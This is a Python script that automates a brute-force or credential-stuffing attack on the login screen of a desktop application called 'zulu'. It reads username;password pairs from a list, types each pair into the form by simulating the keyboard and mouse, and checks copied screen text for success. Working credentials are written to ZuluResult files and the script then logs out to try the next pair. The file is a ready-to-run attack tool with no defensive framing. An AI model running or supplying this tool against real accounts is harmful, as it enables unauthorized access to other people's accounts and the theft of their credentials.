#!/usr/bin/python3
# -*-encoding:utf8 -*-

from    pynput.keyboard import  Controller as kybrd, Key, Listener
from    pynput.mouse    import  Controller as mouse, Button
from    threading       import  Thread
from    clipboard       import  copy    as clicopy, paste as clipaste
from    psutil          import  Process as self
from    time    import  sleep
from    re      import  findall
from    os      import  path, listdir, getcwd
import  sys

kb  = kybrd()       # keyboard
k   = Key           # keys
ms  = mouse()       # mouse
b   = Button        # button

platform = sys.platform

clr1 = '\033[1;33m'
clr2 = '\033[1;31m'
clr3 = '\033[0m'

def tab():
    #print('<tab>')
    kb.tap(k.tab)
    kb.release(k.tab)
    sleep(.2)

def to_prog():
    'script_to_zulu or zulu_to_script'
    # run zulu & wait
    #print('<alt_tab>')
    kb.press(k.alt) ; sleep(.2)
    tab()    ; sleep(.2)
    kb.release(k.alt)

def click(x=50, y=50):
    #print('<click>')
    ms.position = (x, y)
    sleep(.2)
    ms.click(b.left)

def select():
    #print('<select>')
    sleep(.2)
    kb.press(k.ctrl) ; sleep(.3)
    kb.tap('a')      ; kb.release(k.ctrl)
    sleep(.2)

def send_keys(username, password):
    #print('<send_keys>')
    # type useranme
    tab()
    kb.type(username)
    # type password
    tab()
    kb.type(password)
    # send keys
    kb.tap(k.enter)
    kb.release(k.enter)

def copy():
    #print('<copy>')
    # copy
    ms.click(b.right) ; sleep(.9)
    ms.move(10,10)    ; sleep(.9)
    ms.click(b.right) ; sleep(.5)
    ms.move(-10, -10)

def paste():
    #print('<paste>')
    #to_prog() # to this
    # paste error content
    kb.press(k.ctrl)
    # unix paste
    if  not platform.startswith('win'):
        kb.press(k.shift)
    sleep(.2) ; kb.tap('v') ; sleep(.2)
    kb.release(k.shift)
    kb.release(k.ctrl)
    # paste_end content
    [kb.tap(x) for x in '!?????']
    # enter
    kb.tap(k.enter)
    
def cin(string=''):
    while string[-6:] != '!?????':
        string += sys.stdin.read(1)
    return string

def done(msg='Activity'):
    #print('<is_done>')
    for _ in range(7):
        # select
        select()
        # copy text
        copy()
        to_prog() # this
        # run paste
        Thread(target=paste).start()
        # listening for paste_content & check if  done or not
        result = cin()
        sleep(.1)
        if msg in result:
            return True
        elif 'Cancel' in result:
            sleep(1)
        else:
            return False
    click(680, 355)

def save(data,n='0'):
    #print('<save>')
    with open('ZuluResult_{}.txt'.format(n + 1), 'a') as file:
        file.write(data)

def logout(x1=15, y1=30, x2=40,y2=275):
    #print('<logout>')
    # click options
    sleep(.2)
    ms.position = x1, y1
    ms.click(b.left)
    sleep(.2)
    # click logout
    ms.position = x2, y2
    ms.click(b.left)
    sleep(.2)
    while not done('Desktop'):
        sleep(.2)



def test(x1, y1, x2, y2, x3, y3):
    input('This is a test for (click options) .')
    ms.position = x1, y1
    input('This is a test for (click logout) .')
    ms.position = x2, y2
    input('This is a test for (click Cancel) .')
    ms.position = x3, y3
    return x1, y1, x2, y2, x3, y3 if  'y' in input('y/n: ') else None

def main():
    input('''
    Please NOTE that:
        . make "zulu" on fullscreen
        . make off "remeber me" on zulu
        . do not press or type anything when this script on start.
        . for exit press "esc" key
    Click <ENTER> to continue...''')
    #print('<main>')
    keys_list = open(input('keys_list: '))
    to_prog() # zulu
    click()
    # kill "this" if  on_press "esc" key
    Listener(on_press=lambda key:self().kill() if  key == k.esc else '1').start()
    # num of zuluResults file exists
    n = len(findall(r'ZuluResult_\d+.txt', str(listdir(getcwd()))))# brute force folder
    for data in keys_list:
        username, password = data.strip().split(';')
        send_keys(username, password)
        # check if done else fail
        sleep(3)
        if  done():
            print('\n{}[ + ] Login Success : (username:"{}" & password:"{}"){}'.format(clr1, username, password, clr3))
            save(data, n)
            print(' :: Saved ::')
            logout()
            print(' :: Logout :: ')
        else:
            print('\n{}[ - ] Login Failed : ({} & {}){}'.format(clr2, username, password, clr3))
        to_prog() # zulu
        click()
        sleep(1.5)
    keys_list.close()

if  __name__ == '__main__':
    main()

# fail
# There is an error with the credentials

# done
# Activity
